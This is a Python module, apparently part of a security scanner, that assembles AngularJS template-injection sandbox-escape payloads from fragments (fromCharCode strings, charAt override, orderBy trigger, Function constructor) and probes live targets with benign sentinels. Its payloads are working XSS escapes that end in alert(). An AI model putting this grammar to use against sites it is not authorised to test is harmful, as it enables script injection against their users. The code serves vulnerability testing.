"""
Deterministic AngularJS CSTI sandbox-escape SYNTHESIS — pure, browser-free, gateway-free.

The curated ``angular_csti`` / ``angular_no_strings`` vectors in ``xss.yaml`` are canned FULL
payloads: a static cheat-sheet the probe selects from. This module instead BUILDS the escape from
primitive building blocks (``angular_primitives`` in ``xss.yaml``), so ``xss_probe`` can synthesize a
working sandbox escape from scratch — assembling it sub-expression by sub-expression and verifying
each piece against the LIVE target's own ``$parse``/``$eval`` (the tool layer in
``dast/tools/xss_probe_tools.py`` runs that oracle; everything HERE is a pure function over strings,
so the grammar is unit-testable in isolation).

The grammar, decomposed from the published AngularJS 1.x escapes:

  string_builder   ``toString().constructor.fromCharCode(<codes>)``       a string with NO literal —
                                                                          needed when quotes are
                                                                          HTML-encoded near the sink
  charat_override  ``toString().constructor.prototype.charAt=[].join``    swaps the per-char string
                                                                          inspection the expression
                                                                          sandbox relies on
  orderby_trigger  ``[1]|orderBy:<expr>``                                  evaluates ``<expr>`` as the
                                                                          ordering predicate (reaches
                                                                          the sandboxed evaluator)
  function_ctor    ``constructor.constructor(<code>)()``                   Function-constructor code
                                                                          exec — works only where the
                                                                          sandbox is absent/removed
                                                                          (AngularJS 1.0-1.1, 1.6+)

Two strategies, picked by probing the live sandbox:

  * ``constructor`` — Function-constructor code exec. Verified by ``constructor_probe``; used when
    the expression sandbox does not block ``constructor.constructor``.
  * ``charat``      — ``String.prototype.charAt`` override + an ``orderBy`` trigger of a
    ``fromCharCode``-built ``x=<effect>`` assignment. The classic sandboxed-era (1.2-1.5) no-strings
    escape. Verified by ``charat_probe``.

For an oracle step ``<effect>`` is a benign sentinel whose evaluation returns a known value; for the
terminal confirm it is ``alert(<MARK>)``.
"""

from __future__ import annotations

from typing import Dict, List, Tuple

from dast.payloads.loader import get_value

# ── Benign oracle sentinels (evaluate to a known value, no side effects) ──────────────────────────
# A short alpha token the fromCharCode round-trip must reproduce exactly through the app's evaluator.
SENTINEL_STR = "SYNSEN"

# Default grammar fragments — mirror ``angular_primitives`` in xss.yaml; used verbatim when the YAML
# key is absent so synthesis still works if the library is trimmed.
_DEFAULT_PRIMITIVES: Dict[str, str] = {
    "string_builder": "toString().constructor.fromCharCode",
    "charat_override": "toString().constructor.prototype.charAt=[].join",
    "orderby_trigger": "[1]|orderBy:{EXPR}",
    "function_ctor": "constructor.constructor({CODE})()",
    "effect_template": "x={EFFECT}",
    "key_suffix": "=1",
}


def primitives() -> Dict[str, str]:
    """The Angular primitive building blocks, read from ``angular_primitives`` in xss.yaml with the
    published defaults as a fallback (so a trimmed library never breaks synthesis)."""
    lib = get_value("xss", "angular_primitives", {}) or {}
    return {name: (lib.get(name) or default) for name, default in _DEFAULT_PRIMITIVES.items()}


# ── String builder (no-strings) ───────────────────────────────────────────────────────────────────

def char_codes(s: str) -> List[int]:
    """The ``fromCharCode`` numeric sequence for ``s`` (one code point per character)."""
    return [ord(c) for c in s]


def fromcharcode_expr(s: str) -> str:
    """An Angular expression that builds the string ``s`` with NO string literal, via
    ``String.fromCharCode`` reached through ``toString().constructor`` — e.g. ``x=alert(1)`` becomes
    ``toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)``."""
    codes = ",".join(str(c) for c in char_codes(s))
    return f"{primitives()['string_builder']}({codes})"


def effect_string(effect: str) -> str:
    """The assignment the ``orderBy`` trigger evaluates — ``x=<effect>`` by default."""
    return primitives()["effect_template"].replace("{EFFECT}", effect)


# ── Escape builders ────────────────────────────────────────────────────────────────────────────────

def constructor_payload(effect: str, *, strings_ok: bool) -> str:
    """Function-constructor escape ``constructor.constructor(<code>)()`` whose ``<code>`` runs
    ``effect`` (e.g. ``alert(1)``). The code is a string literal when raw quotes survive, else it is
    built with ``fromCharCode`` so no literal quote is needed."""
    code = f"'{effect}'" if strings_ok else fromcharcode_expr(effect)
    return primitives()["function_ctor"].replace("{CODE}", code)


def charat_payload(effect: str, *, key_delivery: bool) -> str:
    """Sandboxed-era no-strings escape: override ``charAt`` on ``String.prototype``, then
    ``orderBy``-trigger a ``fromCharCode``-built ``x=<effect>`` assignment. With ``key_delivery`` the
    trailing ``=1`` KEY→value separator is appended so the whole expression can be delivered AS a
    query-param key (see ``_build_angular_key_url`` in the tool layer)."""
    prims = primitives()
    trigger = prims["orderby_trigger"].replace("{EXPR}", fromcharcode_expr(effect_string(effect)))
    expr = f"{prims['charat_override']};{trigger}"
    return f"{expr}{prims['key_suffix']}" if key_delivery else expr


# ── Oracle probes: (expression, expected stringified result) ────────────────────────────────────────

def oracle_probe() -> Tuple[str, str]:
    """Establishes the sink actually evaluates Angular expressions: ``7*7`` must yield ``49``."""
    return ("7*7", "49")


def fromcharcode_probe() -> Tuple[str, str]:
    """Verifies the ``fromCharCode`` string builder is reachable and round-trips a known sentinel."""
    return (fromcharcode_expr(SENTINEL_STR), SENTINEL_STR)


def constructor_probe() -> Tuple[str, str]:
    """Probes the Function-constructor path benignly: ``constructor.constructor(<code>)()`` where
    ``<code>`` (built with ``fromCharCode``, so no literal) is ``return "<sentinel>"``. Returns the
    sentinel when the sandbox does not block ``constructor.constructor`` (no-sandbox eras)."""
    code = fromcharcode_expr(f'return "{SENTINEL_STR}"')
    return (primitives()["function_ctor"].replace("{CODE}", code), SENTINEL_STR)


def charat_probe() -> Tuple[str, str]:
    """Probes the sandboxed-era override path benignly: perform the ``charAt`` override assignment
    (fails with a sandbox ``$parse:isecfld``/``isecfn`` error if disallowed), then read back a
    ``fromCharCode`` sentinel via a ``;`` sequence."""
    prims = primitives()
    return (f"{prims['charat_override']};{fromcharcode_expr(SENTINEL_STR)}", SENTINEL_STR)
